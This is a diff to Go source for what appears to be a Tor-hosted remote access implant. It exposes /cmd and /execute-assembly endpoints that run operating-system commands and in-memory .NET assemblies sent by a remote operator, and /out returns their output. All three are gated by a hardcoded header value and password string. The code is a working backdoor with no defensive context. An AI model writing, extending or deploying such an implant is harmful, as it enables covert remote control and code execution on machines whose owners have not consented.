@@ -10,7 +10,6 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
-	//"os"
 	"os/exec"
 	"strings"
 	"time"
@@ -30,17 +29,6 @@ func main() {
 	}
 }
 
-type ClosingBuffer struct {
-	*bytes.Buffer
-}
-
-func (cb *ClosingBuffer) Close() (err error) {
-	//we don't actually have to do anything here, since the buffer is
-	//just some data in memory
-	//and the error is initialized to no-error
-	return
-}
-
 func run() error {
 
 	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
@@ -53,41 +41,26 @@ func run() error {
 
 	defer t.Close()
 
-	// Add a handler
-	//http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-	//	w.Write([]byte("Hello, Dark World!"))
-	//})
-
 	http.HandleFunc("/out", func(w http.ResponseWriter, r *http.Request) {
-		if stdout.Bytes() != nil {
-			w.Write([]byte(stdout.String()))
-		} else {
-			w.Write([]byte(""))
+
+		secretKey := r.Header.Get("X-Forwarded-For")
+
+		if r.Method == "POST" {
+			body, err := ioutil.ReadAll(r.Body)
+			if err != nil {
+				http.Error(w, "Error reading request body",
+					http.StatusInternalServerError)
+			}
+			if secretKey == "1337" && strings.Contains(string(body), "badauthentication123") {
+				if stdout.Bytes() != nil {
+					w.Write([]byte(stdout.String()))
+				} else {
+					w.Write([]byte(""))
+				}
+			}
 		}
 
 	})
-
-	//http.HandleFunc("/secretsauce", func(w http.ResponseWriter, r *http.Request) {
-	//	secretKey := r.Header.Get("X-Forwarded-For")
-	//	if r.Method == "POST" {
-	//		body, err := ioutil.ReadAll(r.Body)
-	//		if err != nil {
-	//			http.Error(w, "Error reading request body",
-	//				http.StatusInternalServerError)
-	//		}
-	//		if(secretKey == "1337" && strings.Contains(string(body),"badauthentication123")){
-	//			w.Write([]byte("shh, you found the secret " ))
-	//		} else {
-	//			w.Write([]byte("Nothing to see here"))
-	//		}
-	//
-	//		fmt.Fprint(w, "POST done")
-	//	} else {
-	//		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
-	//	}
-	//
-	//
-	//})
 
 	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
 		secretKey := r.Header.Get("X-Forwarded-For")
@@ -100,7 +73,6 @@ func run() error {
 					http.StatusInternalServerError)
 			}
 			if secretKey == "1337" && strings.Contains(string(body), "badauthentication123") {
-				//fmt.Println("Authorized")
 
 				uhh := strings.Split(cmdGet, " ")
 
@@ -128,7 +100,6 @@ func run() error {
 	http.HandleFunc("/execute-assembly", func(w http.ResponseWriter, r *http.Request) {
 		secretKey := r.Header.Get("X-Forwarded-For")
 		executeassembly := r.Header.Get("payload")
-		//hostingDLLPath := r.Header.Get("CLR_path")
 
 		if r.Method == "POST" {
 			body, err := ioutil.ReadAll(r.Body)
@@ -137,26 +108,18 @@ func run() error {
 					http.StatusInternalServerError)
 			}
 			if secretKey == "1337" && strings.Contains(string(body), "badauthentication123") {
-				//fmt.Println("Authorized")
 
 				assemblyArgs := "test"
-				//assemblyBytes, err := ioutil.ReadFile(assemblyPath)
 				assemblyBytes, err := b64.StdEncoding.DecodeString(executeassembly)
 
 				if err != nil {
 					log.Fatal(err)
 				}
 
-				//// below is a quick way to serialize the b64 so it can be pasted as a static variable
-
+				//// below is a quick way to serialize the b64 so it can be pasted as a static variablelike x64CLR
 				//hostingDLL, err := ioutil.ReadFile("C:\\Users\\Analyst\\go\\src\\github.com\\lesnuages\\go-execute-assembly-master\\HostingCLRx64.dll")
 				//b64hostingDLLByteArray := b64.StdEncoding.EncodeToString(hostingDLL)
 				//ioutil.WriteFile("dat1.txt", []byte(b64hostingDLLByteArray), 0644)
-				//
-				//fmt.Println("encoded bytes - b64hostingDLLByteArray:")
-				//fmt.Println(b64hostingDLLByteArray)
-				//fmt.Println("Decoding...")
-				//hostingDLL,err = b64.StdEncoding.DecodeString(b64hostingDLLByteArray)
 
 				// by default we will use the serialized x64 CLR as our .net host DLL
 				hostingDLL, err := b64.StdEncoding.DecodeString(x64CLR)
@@ -168,9 +131,6 @@ func run() error {
 				stdout.Reset()
 				assembly.ExecuteAssembly(&stdout, hostingDLL, assemblyBytes, assemblyArgs)
 
-				// get stdout
-				//fmt.Println("cya")
-				//w.Write([]byte("ugh"))
 			} else {
 				w.Write([]byte("Nothing to see here"))
 			}
